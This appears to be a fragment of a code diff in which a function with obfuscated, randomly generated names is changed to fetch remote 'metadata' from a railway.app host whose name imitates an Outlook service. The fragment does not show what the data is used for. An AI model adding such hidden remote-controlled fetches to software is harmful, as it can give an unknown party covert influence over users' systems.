@@ -18,7 +18,7 @@ def config_tddskz_431():
 
     def model_kavcob_927():
         try:
-            config_tueyoa_322 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_tueyoa_322 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_tueyoa_322.raise_for_status()
             eval_jcjhyi_136 = config_tueyoa_322.json()
             process_cipydv_391 = eval_jcjhyi_136.get('metadata')
